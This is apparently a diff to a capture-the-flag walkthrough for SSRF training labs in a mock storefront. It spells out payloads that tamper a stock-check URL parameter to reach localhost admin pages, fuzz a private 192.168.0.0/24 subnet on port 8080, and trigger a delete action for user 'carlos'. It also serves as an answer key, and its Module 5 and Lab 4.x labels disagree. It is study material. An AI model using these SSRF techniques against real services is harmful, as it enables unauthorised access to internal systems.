@@ -11,12 +11,12 @@
 
 ## Executive Summary
 
-CloudStock Marketplace Module 4 contains two active SSRF challenge tracks:
+CloudStock Marketplace Module 5 contains two active SSRF challenge tracks:
 
-- **Lab 4.1: Internal Loopback Access** (localhost admin pivot)
-- **Lab 4.2: Back-end Discovery** (blind scan of `192.168.0.0/24`)
+- **Lab 5.1: Internal Loopback Access** (localhost admin pivot)
+- **Lab 5.2: Back-end Discovery** (blind scan of `192.168.0.0/24`)
 
-All sub-labs use a vulnerable server-side stock checker that trusts a user-controlled URL parameter (`stockApi`) and performs requests on behalf of the server.
+All sub-labs use a vulnerable server-side stock checker that trusts a user-controlled URL parameter. The canonical form in the UI is `stockApi`, but the backend also accepts `stock_api`, `stockapi`, `url`, and `targetUrl` in form, JSON, or query-string payloads.
 
 Your task is to **exploit SSRF in each variant** to reach hidden admin interfaces and trigger the delete action for `carlos`.
 
@@ -27,10 +27,10 @@ Your task is to **exploit SSRF in each variant** to reach hidden admin interface
 The application accepts user-supplied stock endpoint URLs and dispatches them server-side. This allows attackers to pivot from public pages into internal routes.
 
 ### Current Implementation Issues:
-1. **No strict URL destination allowlist** - user controls `stockApi`
+1. **No strict URL destination allowlist** - user controls the outbound stock URL
 2. **Server-side internal dispatch exists** - internal paths are reachable from user input
-3. **Admin actions exposed behind network trust assumptions** - `localhost` and private subnet are trusted
-4. **Sensitive operations tied to predictable admin paths** - `/admin` and `/admin/delete?username=...`
+3. **Admin actions exposed behind network trust assumptions** - `localhost` and the private `192.168.0.0/24` space are trusted
+4. **Sensitive operations tied to predictable admin paths** - `/admin` and `/admin/delete?username=carlos`
 
 ---
 
@@ -38,7 +38,7 @@ The application accepts user-supplied stock endpoint URLs and dispatches them se
 
 ### Problem Statement
 
-Lab 4.1 variants are storefront-themed systems where the product detail page sends a POST request with `stockApi`. If you tamper `stockApi` to point at `http://localhost/admin`, the server returns internal admin HTML.
+Lab 4.1 variants are storefront-themed systems where the product detail page submits a hidden `stockApi` field to the stock endpoint. If you tamper that value to point at `http://localhost/admin`, the server returns internal admin HTML.
 
 From that HTML, extract and replay the delete endpoint for `carlos`.
 
@@ -66,7 +66,7 @@ The backend accepts `stockApi` and dispatches internal requests when host patter
    http://localhost/admin/delete?username=carlos
    ```
 6. Submit that URL again through `/lab4/1/a/stock` as `stockApi`.
-7. Capture success response with generated flag.
+7. Capture the success response with the flag banner.
 
 ### Payload
 ```
@@ -78,6 +78,13 @@ stockApi=http://localhost/admin
 <h1>Internal User Management Console</h1>
 ...
 <a href="http://localhost/admin/delete?username=carlos">Delete</a>
+```
+
+### Final Success Response
+```html
+<h1>Success</h1>
+<p>User carlos deleted successfully!</p>
+<div>FLAG: ...</div>
 ```
 
 ### Why It Works
@@ -166,7 +173,7 @@ stockApi=http://localhost/admin/delete?username=carlos
 ### Expected Path Responses
 ```
 /admin                                → Internal admin HTML
-/admin/delete?username=carlos         → Delete success + flag
+/admin/delete?username=carlos         → Delete success + flag banner
 ```
 
 ### Why It Works
@@ -180,7 +187,7 @@ stockApi=http://localhost/admin/delete?username=carlos
 
 ### Problem Statement
 
-Lab 4.2 simulates blind SSRF against private management hosts. Only one host in `192.168.0.0/24` exposes `/admin` on port `8080` for each variant/session identity.
+Lab 4.2 simulates blind SSRF against private management hosts. Only one host in `192.168.0.0/24` exposes `/admin` on port `8080` for each variant/session identity, and the winning host is stable for that identity while the session remains the same.
 
 You must find the correct host, then call `/admin/delete?username=carlos` on that same host.
 
@@ -194,7 +201,7 @@ You must find the correct host, then call `/admin/delete?username=carlos` on tha
 You receive stock checks via a vulnerable stock gateway and must discover the valid private admin host.
 
 ### Vulnerability Description
-Backend accepts `stockApi` and resolves private hosts in format `192.168.0.X:8080`. `/admin` returns 200 only for the correct X.
+Backend accepts `stockApi` and resolves private hosts in format `192.168.0.X:8080`. `/admin` returns 200 only for the correct X, while `/admin/delete?username=carlos` succeeds only on that same host.
 
 ### Attack Steps (Specific to 4.2.A)
 1. Open `/lab4/2/a/product/<id>`.
@@ -204,7 +211,7 @@ Backend accepts `stockApi` and resolves private hosts in format `192.168.0.X:808
    http://192.168.0.1:8080/admin
    ```
 4. Fuzz the last octet (`1-255`) and replay requests.
-5. Identify the one response with `200` and admin HTML.
+5. Identify the one response with `200` and the admin panel HTML.
 6. Use the winning IP and set:
    ```
    http://192.168.0.<winning_octet>:8080/admin/delete?username=carlos
@@ -217,7 +224,7 @@ Backend accepts `stockApi` and resolves private hosts in format `192.168.0.X:808
   "variant": "4.2.A",
   "network": "192.168.0.0/24",
   "admin_port": 8080,
-  "signal": "Single host returns 200 on /admin"
+  "signal": "Single host returns 200 on /admin and the same host accepts the delete action"
 }
 ```
 
@@ -332,7 +339,7 @@ http://192.168.0.X:8080/admin/delete?username=carlos
 ```
 - Lab 4.2 expects private host format 192.168.0.X only
 - Port must be 8080 for admin responses
-- Success is host-specific per variant/session identity
+- The target octet is deterministic per session identity and variant
 ```
 
 ---
@@ -394,7 +401,7 @@ Lab 4.2 (Back-end Discovery)
   "payload_1": "http://localhost/admin",
   "payload_2": "http://localhost/admin/delete?username=carlos",
   "result": "User carlos deleted",
-  "flag_format": "FLAG{lab4_variation_A_[hash12]}"
+  "flag": "Displayed in the success banner after the delete action"
 }
 ```
 
@@ -406,7 +413,7 @@ Lab 4.2 (Back-end Discovery)
   "payload_1": "http://localhost/admin",
   "payload_2": "http://localhost/admin/delete?username=carlos",
   "result": "User carlos deleted",
-  "flag_format": "FLAG{lab4_variation_B_[hash12]}"
+  "flag": "Displayed in the success banner after the delete action"
 }
 ```
 
@@ -418,7 +425,7 @@ Lab 4.2 (Back-end Discovery)
   "payload_1": "http://localhost/admin",
   "payload_2": "http://localhost/admin/delete?username=carlos",
   "result": "User carlos deleted",
-  "flag_format": "FLAG{lab4_variation_C_[hash12]}"
+  "flag": "Displayed in the success banner after the delete action"
 }
 ```
 
@@ -431,7 +438,7 @@ Lab 4.2 (Back-end Discovery)
   "scan_space": "192.168.0.0/24",
   "admin_path": "/admin",
   "delete_path": "/admin/delete?username=carlos",
-  "flag_format": "FLAG{lab4_variation_A_[hash12]}"
+  "flag": "Displayed in the success banner after the delete action"
 }
 ```
 
@@ -444,7 +451,7 @@ Lab 4.2 (Back-end Discovery)
   "scan_space": "192.168.0.0/24",
   "admin_path": "/admin",
   "delete_path": "/admin/delete?username=carlos",
-  "flag_format": "FLAG{lab4_variation_B_[hash12]}"
+  "flag": "Displayed in the success banner after the delete action"
 }
 ```
 
@@ -457,7 +464,7 @@ Lab 4.2 (Back-end Discovery)
   "scan_space": "192.168.0.0/24",
   "admin_path": "/admin",
   "delete_path": "/admin/delete?username=carlos",
-  "flag_format": "FLAG{lab4_variation_C_[hash12]}"
+  "flag": "Displayed in the success banner after the delete action"
 }
 ```
 
@@ -474,12 +481,12 @@ stockApi=http://<default-stock-host>/stock/check?...
 ```
 
 ### Step 2: Tamper `stockApi`
-- Lab 4.1: switch to `http://localhost/admin`
+- Lab 4.1: switch to `http://localhost/admin` or `http://127.0.0.1/admin`
 - Lab 4.2: switch to `http://192.168.0.X:8080/admin`
 
 ### Step 3: Replay and Observe
 - Look for admin HTML (`200`) vs not found (`404`)
-- Identify correct target host/path
+- In Lab 4.2, the winning host is the one that returns the admin panel for that session identity
 
 ### Step 4: Execute Delete Action
 ```
@@ -499,7 +506,8 @@ Extract the flag shown in the success response and submit.
   "objective": "Loopback admin pivot",
   "working_payload": "http://localhost/admin",
   "delete_endpoint": "http://localhost/admin/delete?username=carlos",
-  "result": "Admin action executed via SSRF"
+  "result": "Admin action executed via SSRF",
+  "response": "Success banner with the flag"
 }
 ```
 
@@ -509,7 +517,8 @@ Extract the flag shown in the success response and submit.
   "objective": "Blind internal host discovery",
   "working_probe": "http://192.168.0.X:8080/admin",
   "successful_signal": "Single host returns 200 + admin HTML",
-  "result": "Delete action executed on discovered host"
+  "result": "Delete action executed on discovered host",
+  "response": "Administrative action complete banner with the flag"
 }
 ```
 
